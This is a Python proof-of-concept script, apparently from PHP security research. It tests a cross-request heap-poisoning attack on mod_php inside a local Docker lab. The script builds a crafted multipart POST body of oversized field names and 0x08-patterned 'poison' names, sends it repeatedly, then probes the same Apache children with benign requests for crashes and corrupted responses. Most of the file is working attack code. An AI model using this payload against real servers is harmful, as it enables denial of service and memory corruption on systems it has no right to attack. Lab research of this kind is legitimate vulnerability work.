#!/usr/bin/env python3
"""oom52: cross-request consumer test (the real mod_php experiment).
Swap instrumented libphp.so into php_vuln (backup kept), run:
  baseline -> ATTACK (poisoned pages left in persistent child heap)
  -> BENIGN barrage xN on the SAME children (they must now allocate from
  recycled 0x08 pages) -> census + error.log per request.
Verdict: child death / segv line / garbage response after attack.
"""
import re
import subprocess
import sys
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064
MOD_DST = "/usr/local/lib/php/extensions/no-debug-non-zts-20220829/"


def sh(cmd, timeout=30):
    try:
        r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                           capture_output=True, timeout=timeout)
        return r.stdout.decode("latin1") + r.stderr.decode("latin1")[:200]
    except subprocess.TimeoutExpired:
        return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:150]
    except Exception as e:
        return type(e).__name__, str(e)[:150]


def children():
    out = sh("ps -o pid,ppid -C apache2 2>/dev/null | tail -n +2", 15)
    return sorted(re.findall(r"^\s*(\d+)\s+1\s", out, re.M))


def lab_ini():
    sh("printf 'memory_limit=20600000\\nmax_input_vars=100000\\npost_max_size=4096M\\n' > %s" % CONF)
    sh("apachectl -k graceful 2>/dev/null")
    time.sleep(1.2)


def main():
    n_benign = int(sys.argv[1]) if len(sys.argv) > 1 else 30
    lab_ini()
    try:
        print("[ini]", http("/oom_sapi.php", timeout=10))
        before = children()
        print("[kids]", before)
        att = build_attack()
        print("[attack]", len(att), "bytes", flush=True)
        for i in range(3):
            code, text = http("/oom_mod.php", att,
                              "multipart/form-data; boundary=BOUND", 30)
            print("  atk%d: %s %r" % (i, code, text[:70]), flush=True)
        time.sleep(1)
        mid = children()
        print("[kids-mid]", mid, "gone:", [p for p in before if p not in mid])
        print("[benign barrage x%d]" % n_benign, flush=True)
        bad = 0
        for i in range(n_benign):
            t0 = time.time()
            code, text = http("/oom_mod.php", b"--BOUND\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--BOUND--\r\n",
                              "multipart/form-data; boundary=BOUND", 15)
            ok = code == 200 and "POSTCOUNT=1" in text
            if not ok:
                bad += 1
                print("  benign%d: %s %.1fs %r  <<< ABNORMAL" % (i, code, time.time() - t0, text[:80]), flush=True)
            if i % 10 == 9:
                print("  ..%d done bad=%d" % (i + 1, bad), flush=True)
        time.sleep(1.5)
        after = children()
        print("[kids-after]", after)
        print("[kids-new]", [p for p in after if p not in before],
              "[kids-gone]", [p for p in before if p not in after])
        log = sh("grep -aE 'Segmentation|exit signal|child pid|emalloc|zend_mm' /var/log/apache2/error.log | tail -20", 20)
        print("[errlog-relevant]")
        print(log if log.strip() else "(none)")
        print("[alive]", http("/oom_sapi.php", timeout=10))
        print("[VERDICT] benign_failures=%d kids_gone=%s" %
              (bad, [p for p in before if p not in after]), flush=True)
    finally:
        sh("rm -f %s" % CONF)
        sh("apachectl -k graceful 2>/dev/null")
        time.sleep(1.2)
        print("[restored]", http("/oom_sapi.php", timeout=10))


if __name__ == "__main__":
    main()
